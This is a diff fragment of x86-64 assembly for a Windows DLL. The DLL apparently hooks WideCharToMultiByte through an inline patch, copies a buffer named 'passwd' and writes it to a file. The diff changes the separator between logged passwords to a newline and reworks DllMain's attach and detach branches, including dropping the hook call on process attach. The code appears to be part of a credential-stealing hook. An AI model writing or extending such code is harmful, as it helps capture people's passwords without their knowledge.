@@ -106,12 +106,12 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov rdx, passwd
     call strcpy
 
-    ; replace trailing zero with '20' (ascii space)
+    ; replace trailing zero with '\n' (0xa) (line feed)
     mov rax, passwd
     mov rcx, [rbp - 16]             ; bytes written
     dec rcx
     add rax, rcx
-    mov byte [rax], 0x20
+    mov byte [rax], 0xa             ; new line ascii
 
     sub rsp, 16                     ; 1 arg + 8 byte padding
     mov rcx, [rbp - 24]             ; file handle
@@ -243,15 +243,14 @@ DllMain:
     mov [rbp + 32], r8                      ; reserved
 
     cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
-    jne .continue
-
-    call hook_inline_patch
+    jne .continue_from_process_attach
     jmp .shutdown
 
-.continue:
+.continue_from_process_attach:
     cmp qword [rbp + 24], 0                 ; PROCESS_DETACH
-    jne .shutdown
+    jne .continue_from_process_detach
 
+.continue_from_process_detach:
 .shutdown:
     mov rax, 1
 
